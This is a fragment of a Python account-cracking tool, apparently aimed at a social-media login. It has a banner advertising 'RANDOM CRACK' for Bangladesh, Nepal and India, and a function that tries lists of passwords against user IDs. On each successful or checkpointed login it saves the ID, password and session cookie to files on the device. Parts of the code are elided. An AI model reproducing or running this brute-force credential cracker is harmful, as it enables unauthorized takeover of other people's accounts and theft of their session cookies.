...
███████╗██╔╝ ██╗╚██████╗
╚══════╝╚═╝  ╚═╝ ╚═════╝ 
PAiD COMMAND DATA + WIFI WORKING
LOGING 100% 32+64 VT WORKING                       
===========================▶︎
===================\x1b[1;97m""")
def Main():
	logo()
	print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}NAPAL{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
	line()
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}EMRAN{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}EMRAN-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/SAFWAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[EMRAN] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/𝟮𝟭/𝘿𝘾𝙀-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
